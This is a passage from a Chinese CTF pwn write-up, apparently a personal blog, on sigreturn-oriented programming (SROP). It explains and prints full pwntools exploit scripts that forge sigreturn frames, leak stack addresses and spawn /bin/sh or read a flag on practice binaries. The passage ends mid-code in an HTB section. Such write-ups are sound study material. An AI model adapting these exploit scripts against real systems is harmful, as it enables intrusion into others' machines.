段已知地址</span><br></code></pre></td></tr></table></figure><p>那么我们预期中的程序流程是这样的：</p><ol><li>Sigreturn 恢复恶意 Frame 到寄存器 ，紧接着执行的是 Frame 中的 rip 也就是 <code>syscall;leave;ret</code> ，那么 <code>syscall</code> 就会先在 <code>0x402500</code> 处读入 <code>0x400</code> 的数据（ROP链++）。</li><li><code>leave;ret</code> 意思是 <code>mov rsp,rbp;pop rbp;pop rip</code> ，<code>mov rsp,rbp</code>因为我们构造的是一样的地址所以没影响，<code>pop rbp</code> 会把我们 ROP 链的前八个字节给 🐑 了。所以我们要在 ROP 链上先填充 8 字节的垃圾 rbp 地址，那么 <code>pop rip</code> 时就会执行我们的 ROP 链。（是不是感觉有点栈迁移那味👦）</li></ol><p>ROP 链我们明显要用来伪造第二个 Frame，我们在 <code>0x402500</code> 写入 ROP 链同时我们顺带写上 <code>/bin/sh\0</code>，具体的直接看 Exp 。</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000401032                 pop     rax</span><br><span class="hljs-string">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:0000000000401035                 leave</span><br><span class="hljs-string">.text:0000000000401036                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rax_syscall_leave_ret = <span class="hljs-number">0x401032</span><br>syscall_ret = <span class="hljs-number">0x401033</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rip = syscall_ret<br>fuck.rsp = <span class="hljs-number">0x402500</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0xdeadbeef</span>,rax_syscall_leave_ret,<span class="hljs-number">15</span>,fuck]<br>)<br>sl(payload)<br><br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = <span class="hljs-number">0x402500</span> + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rip = syscall_ret<br>wsnd.rsp = <span class="hljs-number">0xdeadbeef</span><br>wsnd.rbp = <span class="hljs-number">0xdeadbeef</span><br><span class="hljs-comment"># print(len((p64(0xdeadbeef)+p64(rax_syscall_leave_ret)+p64(15)+str(wsnd))))  !!! 272 !!!</span><br>sl((p64(<span class="hljs-number">0xdeadbeef</span>)+p64(rax_syscall_leave_ret)+p64(<span class="hljs-number">15</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>) <span class="hljs-comment"># bin_sh = 0x402500 + 0x200</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="smallest（通过-read-字节数构造的-Sigreturn）"><a class="header-anchor" href="#smallest（通过-read-字节数构造的-Sigreturn）">¶</a>smallest（通过 read 字节数构造的 Sigreturn）</h3><h4 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h4><p>程序越来越短，gaget 越来越少 QWQ。这个相当直接，在 rsp 写处写 <code>0x400</code> 的数据，剩下的爱咋咋地。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329152145281.png" alt="image-20220329152145281"></p><p>并且这题在运行时并没有一个较为固定的可读可写地址，需要 leak 栈地址。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329161716980.png" alt="image-20220329161716980"></p><p><strong>关键点：x64 调用约定中说明了函数调用的返回值是存在 rax 里面的，而 <code>SYS_read</code> 返回值是读取的字节个数。</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+───────+───────+──────────────+──────────────────+<br>|<span class="hljs-string"> %rax  </span>|<span class="hljs-string"> Name  </span>|<span class="hljs-string"> Entry point  </span>|<span class="hljs-string"> Implementation   </span>|<br>+───────+───────+──────────────+──────────────────+<br>|<span class="hljs-string"> 0     </span>|<span class="hljs-string"> read  </span>|<span class="hljs-string"> sys_read     </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>|<span class="hljs-string"> 1     </span>|<span class="hljs-string"> write </span>|<span class="hljs-string"> sys_write    </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>+───────+───────+──────────────+──────────────────+<br></code></pre></td></tr></table></figure><p>而我们发现 write 的调用号是 1 ，意思是我们在读入一个字节的情况下跳过 <code>xor rax,rax</code> 这一步就会 write 出 rsp。</p><ol><li><p>第一次执行先 read 塞入三个 <code>vuln_addr = 0x4000B0</code>，控制程序流程，每一次 ret 都执行一次 vuln。</p></li><li><p>第二次执行仅 read 塞入一个字节，部分覆盖掉返回地址为 <code>NOxor_vuln = 0x4000B3</code> 。</p></li><li><p>第三次执行，由于 write <strong>不受</strong> <code>\x00</code> 截断影响，到 syscall 时就会从 rsp 指针处开始 leak 出此时的栈信息（注意不是 rsp 指针地址，但是会输出很多栈内的地址）。</p></li><li><p>第四次执行，read 塞入 <code>vuln_addr</code> 以及 Frame。</p></li><li><p>第五次执行，read 塞入 <code>syscall;ret</code>  地址以及 Frame 前 7 个字节（凑齐 <code>RAX = 15</code>）。</p></li><li><p>到这就和上题差不多了，第一个 Frame 读入 ROP 链，第二个 Frame 执行 <code>/bin/sh\0</code>。不过 ROP 构造还是要先读入一次，后续凑满 15 字节这样利用。熟悉流程后难度不大。</p></li></ol><h4 id="Exp-execve"><a class="header-anchor" href="#Exp-execve">¶</a>Exp(execve)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26278)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = stack_addr + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="Exp-orw"><a class="header-anchor" href="#Exp-orw">¶</a>Exp(orw)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./smallest&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26278</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">10</span><br>wsnd.rdi = (stack_addr&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>wsnd.rsi = <span class="hljs-number">0x1000</span><br>wsnd.rdx = <span class="hljs-number">7</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>se(p64(stack_addr+<span class="hljs-number">0x200</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>变量名是不是很帅，没啥用，就本地打通， 💨 远程一个都打不通，run 了 run 了。</p><hr><p><em><strong>2022/5/4 0:18 补充</strong></em>：<strong>SROP 在没地方落脚（指写 rsp 或者 rip 的时候），一定记得 vmmap 之后 <code>x/100xg</code> 查看一下代码段有无 text 段指针可以当跳板。</strong></p><h3 id="HTB-sick-rop（扬-text-段）"><a class="header-anchor" href="#HTB-sick-rop（扬-text-段）">¶</a>HTB - sick_rop（扬 text 段）</h3><p>由于网络原因远程没打通，罢 🐦 。主要是利用代码段残留的指针，这里可以写俩次 SROP 执行 <code>/bin/sh\0</code> getshell。</p><p>但是写 <code>mprotect</code> 其实真的只用写一次然后改 rip 就行了。因为没有其他的地址可以落脚，直接把<strong>整个代码段扬成 <code>rwx</code> 就好了</strong>QwQ。非常滴狂野快乐 crazy 不讲道理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 